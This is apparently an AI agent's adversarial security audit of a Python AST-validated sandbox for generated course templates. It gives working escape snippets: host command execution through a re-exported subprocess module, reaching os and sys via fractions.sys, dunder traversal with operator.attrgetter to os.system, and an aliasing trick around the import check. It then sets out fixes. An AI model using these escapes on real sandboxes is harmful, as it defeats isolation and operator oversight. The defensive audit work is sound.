# Adversarial Security Audit & Stress Test Handoff Report: `sandbox.py`

**Agent**: `challenger_phase1_sandbox_security`  
**Date**: 2026-10-11T21:45:00Z  
**Verdict**: **`REQUEST_CHANGES`**

---

## 1. Observation

Direct empirical observations from inspecting `.agents/skills/content-to-course/engine/sandbox.py` and executing test runs:

### Obs 1: AST Validator Implementation (`sandbox.py:82-116`)
```python
82: class SandboxASTValidator(ast.NodeVisitor):
85:     def visit_Import(self, node: ast.Import) -> None:
86:         for alias in node.names:
87:             root = alias.name.split(".")[0]
88:             if root not in ALLOWED_ROOT_MODULES:
89:                 raise SecurityViolationError(...)
93:         self.generic_visit(node)
94: 
95:     def visit_ImportFrom(self, node: ast.ImportFrom) -> None:
96:         if node.module:
97:             root = node.module.split(".")[0]
98:             if root not in ALLOWED_ROOT_MODULES:
99:                 raise SecurityViolationError(...)
103:         self.generic_visit(node)
104: 
105:     def visit_Name(self, node: ast.Name) -> None:
106:         if node.id in BANNED_NAMES:
107:             raise SecurityViolationError(...)
108:         if node.id.startswith("__") and node.id.endswith("__"):
109:             raise SecurityViolationError(...)
110:         self.generic_visit(node)
111: 
112:     def visit_Attribute(self, node: ast.Attribute) -> None:
113:         if node.attr.startswith("__"):
114:             raise SecurityViolationError(...)
115:         self.generic_visit(node)
```
- Line 35-45 defines `ALLOWED_ROOT_MODULES = {"math", "fractions", "statistics", "sympy", "numpy", "scipy", "random", "decimal", "engine"}`.
- Line 47-79 defines `BANNED_NAMES` including `"os"`, `"sys"`, `"subprocess"`, `"socket"`, `"ctypes"`, etc.
- In `visit_Attribute` (lines 112-115), **only** `node.attr.startswith("__")` is checked. `node.attr in BANNED_NAMES` is **never checked**.
- In `visit_ImportFrom` (lines 95-103), **only** `node.module` root is checked. `alias.name` and `alias.asname` in `node.names` are **never checked**.
- `"engine"` is in `ALLOWED_ROOT_MODULES`, and `engine.sandbox` imports `os`, `sys`, and `subprocess` into its module namespace at lines 13-15.

### Obs 2: Submodule Re-exports in Allowed Modules
Running Python reflection on standard library modules allowed by whitelist:
```bash
python -c "import fractions, statistics, numpy; print(hasattr(fractions, 'sys'), hasattr(statistics, 'sys'), hasattr(numpy.ctypeslib, 'ctypes'))"
# Output: True True True
```
Standard library `fractions.py` imports `sys` and `operator`. Standard library `statistics.py` imports `sys`. Package `numpy` provides `numpy.ctypeslib.ctypes`.

### Obs 3: Arbitrary Host Command Execution via `engine.sandbox`
Executing the following snippet through `execute_sandbox_instance`:
```python
import engine.sandbox as es
def generate(rng):
    proc = es.subprocess.run(['cmd.exe', '/c', 'echo PWNED_BY_CHALLENGER'], capture_output=True, text=True)
    return {'vars': {'stdout': proc.stdout.strip()}, 'correct': 1, 'distractors': []}
```
Command output:
```
AST PASSED!
EXECUTION PASSED: {'vars': {'stdout': 'PWNED_BY_CHALLENGER'}, 'correct': 1, 'distractors': []}
```
Result: Arbitrary operating system commands execute cleanly inside the sandbox subprocess with the host process's full permissions.

### Obs 4: Arbitrary Module and `os.system` Retrieval via `fractions.sys` and `fractions.operator`
Executing:
```python
def generate(rng):
    import fractions
    sys_mod = fractions.sys
    return {'vars': {'os': str(sys_mod.modules['os']), 'sub': str(sys_mod.modules['subprocess'])}, 'correct': 1, 'distractors': []}
```
Result: Returns `{'vars': {'os': "<module 'os' (frozen)>", 'sub': "<module 'subprocess' ...>"}}`.

Executing:
```python
def generate(rng):
    import fractions
    get_attr = fractions.operator.attrgetter
    base = get_attr('__' + 'base__')(get_attr('__' + 'class__')(1))
    subclasses = get_attr('__' + 'subclasses__')(base)()
    wrap_close = [c for c in subclasses if get_attr('__' + 'name__')(c) == '_wrap_close'][0]
    os_dict = get_attr('__' + 'globals__')(get_attr('__' + 'init__')(wrap_close))
    return {'vars': {'has_system': 'system' in os_dict}, 'correct': 1, 'distractors': []}
```
Result: Returns `{'vars': {'has_system': True}}` (`os.system` obtained via dunder traversal bypassing `visit_Attribute`).

### Obs 5: `from fractions import sys as safe_helper` AST Evasion
Executing:
```python
from fractions import sys as safe_helper
def generate(rng):
    return {'vars': {'os': str(safe_helper.modules['os'])}, 'correct': 1, 'distractors': []}
```
Result: Passes `validate_code_ast()` with zero errors and executes successfully in the sandbox.

### Obs 6: Cold-Start Overhead of `sympy` + `scipy` vs 2.0s Hard Timeout
Measuring execution time in a cold Python process:
```bash
python -c "import time; t0 = time.time(); import sympy, scipy, scipy.stats; print('took', time.time() - t0)"
# Output: took 1.9279720783233643
```
In `sandbox.py:180-208`, `build_sandbox_globals()` unconditionally imports `sympy`, `scipy`, and `scipy.stats` on every worker startup. On Windows, this cold import requires 1.8-2.1 seconds alone. Because `execute_sandbox_instance` has a default `timeout=2.0`, legitimate single-instance template runs experience intermittent false `SandboxTimeoutError` timeouts before template code can even execute.

### Obs 7: Unseeded Global Random State
In `sandbox.py:225-232`:
```python
225:     if seed is not None:
226:         rng = random.Random(seed)
227:         rng.np = np.random.default_rng(seed)
228:     else:
229:         rng = random.Random()
230:         rng.np = np.random.default_rng()
```
`random.seed(seed)` and `np.random.seed(seed)` are not called. If template code uses `random.randint()` or `np.random.randint()` instead of the passed `rng` parameter, results differ across runs with identical seeds (`r1 != r2`).

### Obs 8: Test Suite Execution Results
Running `python -m pytest tests/test_sandbox_adversarial.py -v`:
- 47/47 tests PASSED in 22.37s.
- 39 baseline checks passed (direct imports, direct builtins, direct dunders blocked; infinite loop timeout cleanly enforced; memory bomb handled).
- 2 legitimate math tests passed (`math`, `fractions`, `statistics`, `sympy`, `numpy`, `scipy.stats`, `random` execute correctly; `rng` determinism verified).
- 6 adversarial vulnerability proofs PASSED, conclusively reproducing all identified vulnerabilities.

---

## 2. Logic Chain

1. **Premise 1 (R3 Specification)**: The sandbox MUST prohibit `os`, `sys`, `subprocess`, `socket`, `open`, `eval`, `exec`, dunder traversal, and resource exhaustion, and isolate execution from the host.
2. **From Obs 1 & Obs 3**: `"engine"` was added to `ALLOWED_ROOT_MODULES` to allow importing rendering helpers (`engine.render`). However, `engine.sandbox` imports `subprocess` and `os`. Because `engine.sandbox` is reachable from root `"engine"`, and `visit_Attribute` does not check banned names, any template can invoke `engine.sandbox.subprocess.run()` to execute arbitrary host commands.
3. **From Obs 1, Obs 2 & Obs 4**: Standard library modules in `ALLOWED_ROOT_MODULES` (`fractions`, `statistics`) contain internal top-level references to `sys` and `operator`. Because `visit_Attribute` only checks `.startswith("__")` and ignores `BANNED_NAMES`, accessing `.sys` is allowed. Furthermore, `operator.attrgetter` allows resolving dunder attributes via string concatenation without using dunder syntax in the AST.
4. **From Obs 1 & Obs 5**: `visit_ImportFrom` only validates the root of `node.module`, but fails to inspect the imported symbols in `node.names`. When an attacker renames a banned symbol via `as`, neither `visit_ImportFrom` nor `visit_Name` triggers, allowing direct import of re-exported modules.
5. **From Obs 6**: Eagerly importing heavyweight libraries (`sympy`, `scipy`) on every worker invocation consumes ~1.9s of the 2.0s budget, rendering single-instance runs fragile on Windows.
6. **From Obs 7**: Omitting global RNG seeding allows unseeded random calls to introduce silent non-determinism.
7. **Deduction**: While direct syntactic attacks are caught, `sandbox.py` is vulnerable to trivial attribute-traversal escapes, arbitrary host command execution, false timeouts, and potential non-determinism. Therefore, the implementation does not yet satisfy security and reliability criteria.

---

## 3. Caveats

- In production usage, templates are generated by LLM subagents and validated by `check_templates.py`. However, the sandbox is the primary security boundary against prompt injection or malicious templates; relying on LLM benignity is unsafe.
- Testing was conducted on Windows with Python 3.12. Timing measurements for cold imports reflect Windows process creation characteristics. On Linux, fork-based execution would have lower import latency, but on Windows (the target environment), the 1.9s cold-start overhead is severe.
- No caveats regarding empirical reproducibility: all exploits were 100% reproduced in automated tests.

---

## 4. Conclusion

**Verdict**: **`REQUEST_CHANGES`**

The implementation in `.agents/skills/content-to-course/engine/sandbox.py` must be updated with the following specific fixes:

### Required Action Items for Phase 1 Builders:

1. **Strengthen `visit_Attribute` in `SandboxASTValidator`**:
   - Check `node.attr in BANNED_NAMES` (blocking `.sys`, `.os`, `.subprocess`, `.socket`, etc. on any object).
   - Check `node.attr.startswith("__") or node.attr.endswith("__")`.
   - Block dangerous helper attributes such as `attrgetter`, `itemgetter`, `methodcaller`, `ctypeslib`, `modules`.
2. **Strengthen `visit_ImportFrom` and `visit_Import`**:
   - In `visit_ImportFrom`: inspect every `alias in node.names`. If `alias.name in BANNED_NAMES` or `alias.name.startswith("__")`, raise `SecurityViolationError`.
   - Reject relative imports where `node.module is None` or `node.level > 0`.
   - Restrict `"engine"` imports: only allow `"engine.render"` specifically, NOT `"engine"` or `"engine.sandbox"`.
3. **Purge Internal Leaks from Whitelisted Modules**:
   - In `build_sandbox_globals()`: clean or wrap modules before placing them in `env`:
     - Delete or shadow `fractions.sys`, `fractions.operator`, `statistics.sys`, `np.ctypeslib`.
     - Or only expose the specific mathematical functions/classes needed (e.g., `Fraction`, `mean`, `median`).
4. **Seed Global RNGs in `run_code_in_env`**:
   - Call `random.seed(seed)` and `np.random.seed(seed)` whenever a seed is provided, guaranteeing determinism even if global functions are accidentally called.
5. **Optimize Worker Cold Start / Timeout**:
   - In `sandbox.py`, avoid importing `sympy`, `scipy`, and `scipy.stats` unconditionally on every single-instance spawn unless required, or increase default single-instance timeout from `2.0s` to `5.0s` on Windows to account for subprocess spawn + cold import overhead.

---

## 5. Verification Method

To independently verify all findings and test suites:

```powershell
# Run the adversarial security test suite
python -m pytest tests/test_sandbox_adversarial.py -v

# Run the standard skill tests
python -m pytest tests/test_skill.py -k TestSandboxSecurity -v
```

**Invalidation Conditions**:
- If `tests/test_sandbox_adversarial.py` can be updated such that the adversarial attacks are caught and raise `SecurityViolationError` at the AST validation step, and the suite passes with 0 escapes, the gate can transition to **`APPROVE`**.
